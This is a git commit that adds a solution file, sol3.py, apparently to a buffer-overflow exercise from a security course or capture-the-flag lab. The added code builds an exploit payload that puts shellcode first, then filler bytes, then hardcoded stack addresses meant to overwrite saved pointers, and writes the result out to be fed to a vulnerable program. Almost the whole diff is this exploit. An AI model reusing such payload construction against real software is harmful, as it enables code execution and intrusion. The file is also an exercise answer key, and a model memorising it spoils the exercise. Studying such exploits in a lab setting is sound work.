4c56c497b019b98a0e63b30bf59170bd7fea723a
priyald <priyank.s.deep@gmail.com>
2024-04-03 08:43:08 +0000

    ANOTHER ONE BITES THE DUST

--- sol3.py
+++ sol3.py
@@ -3,3 +3,13 @@
 import sys
 
 from shellcode import shellcode
+
+#0x7FFFFFF67F00 print
+#0x7ffffff67f36 printend
+#54 length
+#0x7FFFFFF68700 a
+#0x7FFFFFF68708 p
+offset = (2048-54) * b'\x11'
+offset += b'\x00\x7f\xf6\xff\xff\x7f\x00\x00'
+offset += b'\x18\x87\xf6\xff\xff\x7f\x00\x00'
+sys.stdout.buffer.write(shellcode+offset)
